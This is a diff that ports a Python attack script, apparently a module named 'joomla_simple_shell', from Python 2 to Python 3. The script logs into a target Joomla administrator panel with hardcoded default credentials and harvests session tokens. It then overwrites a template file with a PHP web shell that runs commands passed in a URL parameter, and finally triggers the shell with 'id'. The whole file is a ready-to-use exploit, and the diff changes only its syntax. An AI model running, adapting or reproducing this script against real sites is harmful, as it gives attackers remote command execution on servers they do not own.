@@ -13,10 +13,10 @@ N = '\033[1;37m' # White
 import requests
 import re
 
-target = raw_input(""+N+"(console)> ("+R+"joomla_simple_shell"+N+"): ")
-print ""+B+"[*]"+N+" Starting attacks..."
+target = input(""+N+"(console)> ("+R+"joomla_simple_shell"+N+"): ")
+print(""+B+"[*]"+N+" Starting attacks...")
 
-print ''+B+'['+R+'-'+B+'] '+N+'Checking: ' + str(target)
+print(''+B+'['+R+'-'+B+'] '+N+'Checking: ' + str(target))
 
 # initGET
 session = requests.session()
@@ -30,9 +30,9 @@ found_token = re.search(find_token, initresp)
 
 if found_token:
   initToken = found_token.group(1)
-  print '"+B+"["+R+"!"+B+"] "+N+"Found init token: ' + initToken
+  print('"+B+"["+R+"!"+B+"] "+N+"Found init token: ' + initToken)
 
-  print '"+B+"["+R+"*"+B+"]"+N+" Preparing login request'
+  print('"+B+"["+R+"*"+B+"]"+N+" Preparing login request')
   data_login = {
         'username':'user',
         'passwd':'bitnami',
@@ -46,11 +46,11 @@ if found_token:
   doLogin = session.post(data_link, data=data_login)
   loginResp = doLogin.text
 
-  print ''+B+'[+] '+N+'At this stage we should be logged-in as an admin :)'
+  print(''+B+'[+] '+N+'At this stage we should be logged-in as an admin :)')
 
   uplink = target + '/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA%3D'
   filename = 'jsstrings.php'
-  print ''+B+'[+] '+N+'File to change: ' + str(filename)
+  print(''+B+'[+] '+N+'File to change: ' + str(filename))
 
   getnewtoken = session.get(uplink)
   getresptoken = getnewtoken.text
@@ -60,14 +60,14 @@ if found_token:
 
   if newFound:
     newOneTok = newFound.group(1)
-    print ''+B+'[+] '+N+'Grabbing new token from logged-in user: ' + newOneTok
+    print(''+B+'[+] '+N+'Grabbing new token from logged-in user: ' + newOneTok)
 
     getjs = target+'/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA%3D'
     getjsreq = session.get(getjs)
     getjsresp = getjsreq.text
 
     # print getjsresp
-    print ''+B+'[+] '+N+'Shellname: ' + filename
+    print(''+B+'[+] '+N+'Shellname: ' + filename)
     shlink = target + '/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA='
     shdata_up = {
         'jform[source]':'<?php system($_GET["x"]);',
@@ -78,12 +78,12 @@ if found_token:
     }
     shreq = session.post(shlink, data=shdata_up)
     path2shell = '/templates/beez3/jsstrings.php?x=id'
-    print ''+B+'['+R+'!'+B+'] '+N+'Shell is ready to use: ' + str(path2shell)
-    print ''+B+'[+] '+N+'Checking:'
+    print(''+B+'['+R+'!'+B+'] '+N+'Shell is ready to use: ' + str(path2shell))
+    print(''+B+'[+] '+N+'Checking:')
     shreq = session.get(target + path2shell)
     shresp = shreq.text
 
-    print shresp
+    print(shresp)
 
 
-print '\n'+B+'[!] '+N+'Module finished.'
+print('\n'+B+'[!] '+N+'Module finished.')
